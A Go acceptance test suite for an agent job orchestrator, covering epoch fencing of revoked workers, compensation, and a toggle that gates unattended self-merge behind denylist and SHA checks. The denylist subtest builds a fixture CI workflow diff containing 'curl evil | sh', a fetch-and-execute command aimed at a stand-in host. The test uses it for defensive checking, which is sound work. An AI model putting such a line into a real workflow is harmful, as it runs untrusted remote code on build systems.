// M11 acceptance: Epoch-namespaced side-effects + compensation (DESIGN §3.5/§6.5,
// I-12) — the structural realization of T2 (ack != execution) that ENABLES the
// unattended merge (§14 Branch B). Proven end-to-end over the real HTTP worker
// surface against a real SQLite store, a real local BARE repo fixture (no network,
// no GitHub), an in-memory fakeGitHub (BUILD.md §6.4), the serialized project-OUT
// sender, reconcile-IN, and the single durable-timer poller with liveness +
// compensation wired.
//
// DONE-WHEN (each proven below by a real, non-skipped test):
//   - a worker revoked mid-build then reconnecting and pushing to its STALE epoch ref
//     -> the ref is NEVER fast-forwarded; its CI can't satisfy the live gate;
//     compensation DROPPED it + bumped the epoch (the reconnect is 409'd);
//   - a live re-dispatch completes;
//   - with the §14 toggle ON, a clean/denylist-clear/in-budget/unmoved-SHA diff merges
//     UNATTENDED via the (fake) merge queue with reconciled provenance;
//   - a denylist / SHA-moved diff still falls to handoff;
//   - the toggle OFF restores Branch A (clean diff -> handoff -> human).
package acceptance

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/samhotchkiss/flowbee/internal/alarm"
	"github.com/samhotchkiss/flowbee/internal/api"
	"github.com/samhotchkiss/flowbee/internal/clock"
	"github.com/samhotchkiss/flowbee/internal/content"
	gh "github.com/samhotchkiss/flowbee/internal/github"
	"github.com/samhotchkiss/flowbee/internal/gitops"
	"github.com/samhotchkiss/flowbee/internal/job"
	"github.com/samhotchkiss/flowbee/internal/ledger"
	"github.com/samhotchkiss/flowbee/internal/project"
	"github.com/samhotchkiss/flowbee/internal/reconcile"
	"github.com/samhotchkiss/flowbee/internal/store"
	"github.com/samhotchkiss/flowbee/internal/testutil"
	"github.com/samhotchkiss/flowbee/internal/ulid"
)

// m11Env wires the control plane (private API with a local mirror for `worktree`
// provisioning), the serialized project-OUT sender, reconcile-IN, and the liveness +
// compensation poller — all against ONE scriptable fakeGitHub and a real bare repo.
type m11Env struct {
	st      *store.Store
	fake    *gh.Fake
	clk     *clock.Fake
	srv     *api.Server
	sender  *project.Sender
	rec     *reconcile.Reconciler
	poller  *alarm.Poller
	cfg     store.LivenessConfig
	mirror  *gitops.Mirror
	base    string
	private *httptest.Server
}

func newM11Env(t *testing.T, policy job.Policy) *m11Env {
	t.Helper()
	mirrorPath, base := newBareFixture(t)
	mirror := gitops.Open(mirrorPath)
	st := testutil.NewStore(t)
	clk := clock.NewFake(time.Unix(1_700_000_000, 0))
	srv := api.New(st, clk, ulid.NewMinter(nil), api.Config{
		LeaseTTL: 30 * time.Minute, LongPollWait: 500 * time.Millisecond,
		LeaseTTLS: 1800, HeartbeatIntervalS: 60, Policy: policy,
		MirrorPath: mirror.Path,
	}, "m11")
	fake := gh.NewFake()
	sender := project.New(st, fake, clk, srv.Broker())
	sender.WithHistory(fakeMergeHistory{}, "main") // self-merge requires a mirror to pin+re-verify
	rec := reconcile.New(st, fake, clk, srv.Broker())
	cfg := store.LivenessConfig{
		PhaseBudget: 10 * time.Minute, AbsoluteCap: 60 * time.Minute,
		Rung2Window: 10 * time.Minute, GovernorCeiling: 5,
	}
	poller := alarm.New(st, clk, time.Millisecond, srv.Broker()).
		WithLiveness(cfg, store.DBFactSource{DB: st.DB}, srv.Broker()).
		WithCompensation(mirror)
	private := httptest.NewServer(srv.PrivateHandler())
	t.Cleanup(private.Close)
	return &m11Env{
		st: st, fake: fake, clk: clk, srv: srv, sender: sender, rec: rec,
		poller: poller, cfg: cfg, mirror: mirror, base: base, private: private,
	}
}

func (e *m11Env) drain(t *testing.T, ctx context.Context) int {
	t.Helper()
	total := 0
	for {
		n, err := e.sender.DrainOnce(ctx)
		if err != nil {
			t.Fatalf("drain: %v", err)
		}
		total += n
		if n == 0 {
			return total
		}
	}
}

// seedBuild seeds a ready build job at the fixture base SHA.
func (e *m11Env) seedBuild(t *testing.T, ctx context.Context, jobID string) {
	t.Helper()
	if _, err := e.st.SeedJob(ctx, store.SeedParams{
		ID: jobID, Kind: job.KindBuild, Flow: "build", Stage: "build",
		Role: job.RoleEngWorker, BaseSHA: e.base,
		RequiredCapabilities: []string{"role:eng_worker"}, Now: e.clk.Now(),
	}); err != nil {
		t.Fatalf("seed build %s: %v", jobID, err)
	}
}

// agentPushEpoch provisions a worktree off the mirror at the lease's base SHA, makes a
// change, and pushes it to the lease's epoch ref — exactly what a same-box `worktree`
// worker does (§7.4). Returns the pushed SHA + ref.
func (e *m11Env) agentPushEpoch(t *testing.T, jobID string, epoch int, file, body string) (sha, ref string) {
	t.Helper()
	wsRoot := t.TempDir()
	ws := gitops.WorktreeBase(wsRoot, jobID, epoch)
	wt, err := e.mirror.AddWorktree(ws, e.base)
	if err != nil {
		t.Fatalf("add worktree e%d: %v", epoch, err)
	}
	defer wt.Destroy()
	if err := os.WriteFile(filepath.Join(ws, file), []byte(body), 0o644); err != nil {
		t.Fatalf("agent write: %v", err)
	}
	sha, ref, err = wt.CommitAndPushEpoch(jobID, epoch, "build by agent e"+itoa(epoch))
	if err != nil {
		t.Fatalf("commit+push e%d: %v", epoch, err)
	}
	return sha, ref
}

// ── TestM11_RevokedZombieFencedAndCompensated_ThenLiveRedispatch ──────────────────
// A worker revoked mid-build reconnects and pushes to its STALE epoch ref: the ref is
// never fast-forwarded, its CI can't satisfy the live gate, compensation dropped it +
// bumped the epoch (409'd). A live re-dispatch then completes.
func TestM11_RevokedZombieFencedAndCompensated_ThenLiveRedispatch(t *testing.T) {
	e := newM11Env(t, job.Policy{})
	ctx := context.Background()
	url := e.private.URL
	jobID := "build-zombie"
	e.seedBuild(t, ctx, jobID)

	// the eng_worker leases (epoch 1) and arms the liveness deadline timers.
	worker := registerCaps(t, ctx, url, "zoe", "codex", []string{"role:eng_worker", "model_family:codex"})
	g1, ok, err := worker.Lease(ctx, "zoe", "codex", "")
	if err != nil || !ok || g1.JobID != jobID {
		t.Fatalf("lease ok=%v err=%v", ok, err)
	}
	if g1.PushTarget != gitops.EpochRef(jobID, g1.LeaseEpoch) {
		t.Fatalf("lease must carry the epoch push target, got %q", g1.PushTarget)
	}
	if err := e.st.ArmLeaseLivenessTimers(ctx, jobID, g1.LeaseEpoch, e.clk.Now(), e.cfg); err != nil {
		t.Fatalf("arm timers: %v", err)
	}

	// the agent pushes its build to the epoch-1 ref AND its CI goes green at that epoch
	// (recorded (job, epoch)). It is mid-build (no result submitted yet).
	deadEpoch := g1.LeaseEpoch
	zSHA, zRef := e.agentPushEpoch(t, jobID, deadEpoch, "feature.go", "package x // zombie\n")
	if err := e.st.RecordEpochCI(ctx, jobID, deadEpoch, zSHA, store.EpochCISuccess, e.clk.Now()); err != nil {
		t.Fatalf("record epoch CI: %v", err)
	}
	if _, ok := e.mirror.RefSHA(zRef); !ok {
		t.Fatalf("the zombie's epoch ref must exist before compensation")
	}

	// the worker is revoked mid-build: it partitions, Flowbee's clock crosses the
	// absolute cap, the poller revokes the lease (epoch++) AND fires compensation —
	// dropping the dead epoch ref, cancelling its CI, drafting-back any PR.
	e.clk.Advance(61 * time.Minute)
	e.poller.Tick(ctx)

	j, _ := e.st.GetJob(ctx, jobID)
	if j.State != job.StateReady {
		t.Fatalf("a revoked-mid-build worker must re-dispatch to ready, got %s", j.State)
	}
	if j.LeaseEpoch != deadEpoch+1 {
		t.Fatalf("the revoke must BUMP the epoch (the zombie's fence): %d -> %d", deadEpoch, j.LeaseEpoch)
	}

	// compensation DROPPED the stale epoch ref (orphaned the zombie's work, §6.5.4).
	if _, ok := e.mirror.RefSHA(zRef); ok {
		t.Fatalf("compensation must drop the dead epoch ref (orphan it), but %s survives", zRef)
	}
	comp, found, _ := e.st.CompensationFor(ctx, jobID, deadEpoch)
	if !found || !comp.RefDropped || !comp.CICancelled {
		t.Fatalf("compensation must record ref-drop + CI-cancel for the dead epoch: %+v found=%v", comp, found)
	}
	// the dead epoch's CI is cancelled — it can NEVER satisfy the live gate.
	if st, _ := e.st.EpochCIStateFor(ctx, jobID, deadEpoch); st != store.EpochCICancelled {
		t.Fatalf("the dead epoch's CI must be cancelled, got %s", st)
	}

	// the reconnecting zombie pushes AGAIN to its stale epoch ref and POSTs its result
	// carrying the OLD epoch -> 409. Exactly-once acknowledgement even though it
	// executed a full build (T2). Its re-pushed ref is still never promoted.
	_, _ = e.agentPushEpoch(t, jobID, deadEpoch, "feature.go", "package x // zombie again\n")
	_, code, err := worker.Result(ctx, jobID, deadEpoch, "zombie-result",
		map[string]any{"kind": "patch", "base_sha": e.base, "pushed_ref": zRef})
	if err != nil {
		t.Fatalf("zombie result: %v", err)
	}
	if code != http.StatusConflict {
		t.Fatalf("the reconnecting zombie's result must be 409'd (stale epoch), got %d", code)
	}
	// the job did not advance off the zombie's report.
	if jz, _ := e.st.GetJob(ctx, jobID); jz.State != job.StateReady {
		t.Fatalf("the zombie report must not advance the job, got %s", jz.State)
	}

	// the live re-dispatch: a fresh worker leases (epoch 2), pushes its epoch-2 ref,
	// submits the result; Flowbee VALIDATES the live epoch and PROMOTES that ref onto
	// the real branch — the stale epoch-1 ref is never promoted.
	live := registerCaps(t, ctx, url, "liv", "codex", []string{"role:eng_worker", "model_family:codex"})
	g2, ok, err := live.Lease(ctx, "liv", "codex", "")
	if err != nil || !ok || g2.JobID != jobID {
		t.Fatalf("re-lease ok=%v err=%v", ok, err)
	}
	if g2.LeaseEpoch == deadEpoch {
		t.Fatalf("the re-dispatch must lease at a fresh epoch, got %d", g2.LeaseEpoch)
	}
	liveSHA, liveRef := e.agentPushEpoch(t, jobID, g2.LeaseEpoch, "feature.go", "package x // live\n")

	// Flowbee promotes ONLY the live epoch's ref (post-validation, §6.5.1). A stale
	// epoch passed here is orphaned, never promoted.
	branch := "refs/heads/flowbee-" + jobID
	promotedStale, err := e.st.PromoteResult(ctx, e.mirror, jobID, deadEpoch, branch, e.clk.Now())
	if err != nil {
		t.Fatalf("promote stale: %v", err)
	}
	if promotedStale {
		t.Fatalf("a STALE epoch must NEVER be promoted")
	}
	if _, ok := e.mirror.RefSHA(branch); ok {
		t.Fatalf("the real branch must not exist after a stale-epoch promote attempt")
	}
	promotedLive, err := e.st.PromoteResult(ctx, e.mirror, jobID, g2.LeaseEpoch, branch, e.clk.Now())
	if err != nil || !promotedLive {
		t.Fatalf("the LIVE epoch must promote, promoted=%v err=%v", promotedLive, err)
	}
	if got, ok := e.mirror.RefSHA(branch); !ok || got != liveSHA {
		t.Fatalf("the real branch must fast-forward to the LIVE epoch SHA %s, got %q", liveSHA, got)
	}
	if got, _ := e.st.GetJob(ctx, jobID); got.BuildEpoch != g2.LeaseEpoch {
		t.Fatalf("build_epoch must be the promoted live epoch %d, got %d", g2.LeaseEpoch, got.BuildEpoch)
	}

	// the live epoch's CI goes green; the worker submits the result -> review_pending.
	if err := e.st.RecordEpochCI(ctx, jobID, g2.LeaseEpoch, liveSHA, store.EpochCISuccess, e.clk.Now()); err != nil {
		t.Fatalf("record live CI: %v", err)
	}
	if _, st, err := live.Result(ctx, jobID, g2.LeaseEpoch, "live-result",
		map[string]any{"kind": "patch", "base_sha": e.base, "pushed_ref": liveRef,
			"diff": m9Diff("feature.go", "func Live() {}")}); err != nil || st != http.StatusOK {
		t.Fatalf("live result st=%d err=%v", st, err)
	}
	if jr, _ := e.st.GetJob(ctx, jobID); jr.State != job.StateReviewPending {
		t.Fatalf("the live build result must land review_pending, got %s", jr.State)
	}

	// the live gate honors ONLY the live epoch's CI: the dead epoch was green once, but
	// LiveEpochCIGreen reads build_epoch (the live one) — the zombie can't satisfy it.
	liveGreen, err := e.st.LiveEpochCIGreen(ctx, jobID)
	if err != nil || !liveGreen {
		t.Fatalf("the LIVE epoch's CI must be green for the gate, got %v err=%v", liveGreen, err)
	}

	// Fold reproduces the projection across the revoke + promotion + compensation.
	evs, _ := e.st.LoadEvents(ctx, jobID)
	folded, _ := ledger.Fold(evs)
	jj, _ := e.st.GetJob(ctx, jobID)
	if folded.State != jj.State || folded.LeaseEpoch != jj.LeaseEpoch || folded.BuildEpoch != jj.BuildEpoch {
		t.Fatalf("Fold != projection: fold={%s e%d be%d} proj={%s e%d be%d}",
			folded.State, folded.LeaseEpoch, folded.BuildEpoch,
			jj.State, jj.LeaseEpoch, jj.BuildEpoch)
	}
}

// ── TestM11_ToggleOnCleanDiffMergesUnattended ─────────────────────────────────────
// With the §14 toggle ON, a clean/denylist-clear/in-budget/unmoved-SHA diff merges
// UNATTENDED via the (fake) merge queue, and the merge reconciles to done with
// provenance attributed to the reviewer's minted self_merge verdict (I-9).
func TestM11_ToggleOnCleanDiffMergesUnattended(t *testing.T) {
	e := newM11Env(t, job.Policy{AllowSelfMerge: true}) // Branch B
	ctx := context.Background()
	url := e.private.URL
	jobID := "build-unattended"
	e.seedBuild(t, ctx, jobID)

	// build: lease, push the live epoch ref, promote it, record green epoch CI, submit.
	worker := registerCaps(t, ctx, url, "uma", "codex", []string{"role:eng_worker", "model_family:codex"})
	g, _, _ := worker.Lease(ctx, "uma", "codex", "")
	liveSHA, liveRef := e.agentPushEpoch(t, jobID, g.LeaseEpoch, "ok.go", "package y\n")
	branch := "refs/heads/flowbee-" + jobID
	if pr, err := e.st.PromoteResult(ctx, e.mirror, jobID, g.LeaseEpoch, branch, e.clk.Now()); err != nil || !pr {
		t.Fatalf("promote live: %v (promoted=%v)", err, pr)
	}
	if err := e.st.RecordEpochCI(ctx, jobID, g.LeaseEpoch, liveSHA, store.EpochCISuccess, e.clk.Now()); err != nil {
		t.Fatalf("epoch CI: %v", err)
	}
	if _, _, err := worker.Result(ctx, jobID, g.LeaseEpoch, "b1",
		map[string]any{"kind": "patch", "base_sha": e.base, "pushed_ref": liveRef,
			"diff": m9Diff("ok.go", "func OK() {}"), "blast_radius": map[string]any{"paths": []string{"ok.go"}}}); err != nil {
		t.Fatalf("build result: %v", err)
	}

	// Flowbee opens the PR + stamps the number (the §7.3 trigger).
	headSHA := "head-unattended"
	if enq, err := e.st.EnqueuePROpen(ctx, jobID, headSHA, "main"); err != nil || !enq {
		t.Fatalf("enqueue PR-open enq=%v err=%v", enq, err)
	}
	e.drain(t, ctx)
	prNum, _ := e.st.JobPR(ctx, jobID)
	if prNum == 0 {
		t.Fatalf("Flowbee must open the PR and stamp the number")
	}

	// reconcile-IN supplies green Domain-B facts at the stamped PR BEFORE the
	// reviewer leases (the review gate is offered only once CI is green); then the
	// distinct reviewer leases the gate and approves self_merge.
	if err := e.st.UpsertDomainBFacts(ctx, jobID, job.DomainBFacts{
		PRExists: true, PRNumber: prNum, HeadSHA: headSHA, BaseSHA: e.base, CIGreen: true,
	}); err != nil {
		t.Fatalf("reconcile facts: %v", err)
	}
	e.fake.SetPR(gh.PullRequest{
		Number: prNum, HeadRefOid: headSHA, BaseRefOid: e.base,
		CIRollup: gh.CISuccess, PassedChecks: []string{"acceptance"},
	})
	reviewer := registerCaps(t, ctx, url, "ren", "opus", []string{"role:code_reviewer", "model_family:opus"})
	rg, ok, err := reviewer.Lease(ctx, "ren", "opus", string(job.RoleCodeReviewer))
	if err != nil || !ok || rg.JobID != jobID {
		t.Fatalf("reviewer lease ok=%v err=%v", ok, err)
	}
	rv, code, err := reviewer.Review(ctx, jobID, rg.LeaseEpoch, "r1", "approved", "self_merge", "", "")
	if err != nil || code != http.StatusOK {
		t.Fatalf("review code=%d err=%v", code, err)
	}
	if !rv.Minted || rv.JobState != string(job.StateMerging) {
		t.Fatalf("Branch B clean diff must self-merge (merging), got %+v", rv)
	}
	// the minted verdict carries the self_merge disposition (reviewed provenance, I-9).
	jm, _ := e.st.GetJob(ctx, jobID)
	if jm.Verdict == nil || jm.Verdict.Disposition != job.DispositionSelfMerge {
		t.Fatalf("verdict must carry self_merge disposition: %+v", jm.Verdict)
	}

	// Flowbee enqueues the merge to the (fake) queue — both arms physically merge via
	// the queue; the worker never calls GitHub (§5.4, R4).
	if menq, err := e.st.EnqueueMergeForJob(ctx, jobID, e.clk.Now()); err != nil || !menq {
		t.Fatalf("enqueue merge enq=%v err=%v", menq, err)
	}
	e.drain(t, ctx)
	if eq := e.fake.Enqueued(); len(eq) != 1 || eq[0] != prNum {
		t.Fatalf("the PR must be enqueued to the merge queue once, got %v", eq)
	}

	// the merge queue merges (NO human); reconcile-IN observes the terminal merged fact
	// and flips the job to done. Flowbee records the reconciled merge-commit provenance.
	mergeCommit := "merge-commit-unattended"
	e.fake.SetPR(gh.PullRequest{
		Number: prNum, HeadRefOid: headSHA, BaseRefOid: e.base,
		Merged: true, MergeCommit: mergeCommit, CIRollup: gh.CISuccess,
		UpdatedAt: time.Unix(1_700_002_000, 0),
	})
	if _, err := e.rec.Sweep(ctx); err != nil {
		t.Fatalf("reconcile sweep: %v", err)
	}
	if err := e.st.RecordUnattendedMerge(ctx, jobID, mergeCommit, e.clk.Now()); err != nil {
		t.Fatalf("record unattended merge: %v", err)
	}
	jd, _ := e.st.GetJob(ctx, jobID)
	if jd.State != job.StateDone {
		t.Fatalf("the unattended merge must reconcile to done, got %s", jd.State)
	}
	if jd.MergeProvenance != mergeCommit {
		t.Fatalf("the done job must record the reconciled merge provenance, got %q", jd.MergeProvenance)
	}

	// the unattended-merge audit event is in the ledger (provenance: no human in loop).
	evs, _ := e.st.LoadEvents(ctx, jobID)
	if !hasEvent(evs, ledger.KindUnattendedMerged) {
		t.Fatalf("the ledger must record the unattended merge (Branch B provenance)")
	}
	if !hasEvent(evs, ledger.KindEpochPromoted) {
		t.Fatalf("the ledger must record the epoch promotion (§6.5.1)")
	}
}

// ── TestM11_DenylistAndSHAMovedFallToHandoff ──────────────────────────────────────
// Even with the toggle ON, a denylist-touching diff AND a SHA-moved diff each still
// fall to handoff (the content gate / SHA-binding deny self_merge, §5.4 cond. 2 + 5).
func TestM11_DenylistAndSHAMovedFallToHandoff(t *testing.T) {
	ctx := context.Background()

	// case A: a .github/workflows patch -> handoff regardless of self_merge ON.
	t.Run("denylist", func(t *testing.T) {
		e := newM11Env(t, job.Policy{AllowSelfMerge: true})
		jobID := "build-denylist"
		diff := m9Diff(".github/workflows/ci.yml", "  run: curl evil | sh")
		reviewer, rg := driveBuildWithPatch(t, ctx, e.st, e.private.URL, jobID, diff,
			content.BlastRadius{Paths: []string{".github/workflows/ci.yml"}})
		seedGreenFacts(t, ctx, e.st, jobID)
		resp, code, err := reviewer.Review(ctx, jobID, rg.LeaseEpoch, "r", "approved", "self_merge", "", "")
		if err != nil || code != http.StatusOK {
			t.Fatalf("review code=%d err=%v", code, err)
		}
		if resp.JobState != string(job.StateMergeHandoff) {
			t.Fatalf("a denylist diff must fall to handoff even with self_merge ON, got %s", resp.JobState)
		}
	})

	// case B: a SHA move since review denies self_merge -> handoff (§5.4 condition 5,
	// I-5). A self_merge-eligible verdict is minted bound to head-1; the head then MOVES
	// to head-2 before the branch point dispatches. The branch point re-checks the §5.4
	// predicate (SelfMergeEligible re-Verifies the verdict against the LIVE facts): the
	// moved head fails the binding, so the branch takes handoff instead of merging.
	t.Run("sha_moved", func(t *testing.T) {
		e := newM11Env(t, job.Policy{AllowSelfMerge: true})
		jobID := "build-shamove"

		// stage a `mergeable` job carrying a self_merge verdict bound to head-1 (exactly
		// what the gate mints from green facts), a clean content_result, and a stamped PR.
		v := job.MintVerdict(job.VerdictApproved, job.DispositionSelfMerge, "head-1", "base1")
		vJSON, _ := json.Marshal(v)
		clean := content.Check(content.Patch{Diff: m9Diff("ok.go", "func OK() {}"),
			Declared: content.BlastRadius{Paths: []string{"ok.go"}}}, content.Limits{})
		if !clean.Eligible() {
			t.Fatalf("the staged diff must be content-eligible")
		}
		cJSON, _ := json.Marshal(clean)
		if _, err := e.st.DB.ExecContext(ctx, `
			INSERT INTO jobs (id, kind, flow, stage, state, role, base_sha, head_sha,
			                  priority, blocked_by, required_capabilities, enqueued_at,
			                  lease_epoch, attempts, max_attempts, bounces, max_bounces, job_seq,
			                  verdict, content_result, pr_number)
			VALUES (?, 'build', 'build', 'merge', 'mergeable', 'merger', 'base1', 'head-1',
			        0, '[]', '[]', ?, 1, 0, 5, 0, 3, 0, ?, ?, 1)`,
			jobID, e.clk.Now().Format(time.RFC3339Nano), string(vJSON), string(cJSON)); err != nil {
			t.Fatalf("stage mergeable job: %v", err)
		}

		// the head MOVES to head-2 (a reconcile-IN observation): the verdict binds to
		// head-1, so the §5.4 condition-5 re-bind fails at the branch point.
		if err := e.st.UpsertDomainBFacts(ctx, jobID, job.DomainBFacts{
			PRExists: true, PRNumber: 1, HeadSHA: "head-2-MOVED", BaseSHA: "base1", CIGreen: true,
		}); err != nil {
			t.Fatalf("move head: %v", err)
		}
		final, err := e.st.DispatchMerge(ctx, store.DBFactSource{DB: e.st.DB}, job.Policy{AllowSelfMerge: true},
			store.DispatchMergeParams{JobID: jobID, Now: e.clk.Now()})
		if err != nil {
			t.Fatalf("dispatch merge: %v", err)
		}
		if final != job.StateMergeHandoff {
			t.Fatalf("a SHA move since review must fall to handoff (binding superseded), got %s", final)
		}
	})
}

// ── TestM11_ToggleOffRestoresBranchA ──────────────────────────────────────────────
// With the toggle OFF, the SAME clean diff that self-merges under Branch B goes to
// handoff (human merges) — proving the toggle is a pure policy flip, not a rewire.
func TestM11_ToggleOffRestoresBranchA(t *testing.T) {
	e := newM11Env(t, job.Policy{AllowSelfMerge: false}) // Branch A
	ctx := context.Background()
	jobID := "build-branch-a"
	diff := m9Diff("ok.go", "func OK() {}")
	reviewer, rg := driveBuildWithPatch(t, ctx, e.st, e.private.URL, jobID, diff,
		content.BlastRadius{Paths: []string{"ok.go"}})
	seedGreenFacts(t, ctx, e.st, jobID)
	resp, code, err := reviewer.Review(ctx, jobID, rg.LeaseEpoch, "r", "approved", "self_merge", "", "")
	if err != nil || code != http.StatusOK {
		t.Fatalf("review code=%d err=%v", code, err)
	}
	if !resp.Minted {
		t.Fatalf("a clean approval must mint")
	}
	if resp.JobState != string(job.StateMergeHandoff) {
		t.Fatalf("Branch A must route the clean diff to handoff (human merges), got %s", resp.JobState)
	}
}

// ── helpers ──

func hasEvent(evs []ledger.Event, kind ledger.EventKind) bool {
	for _, e := range evs {
		if e.Kind == kind {
			return true
		}
	}
	return false
}
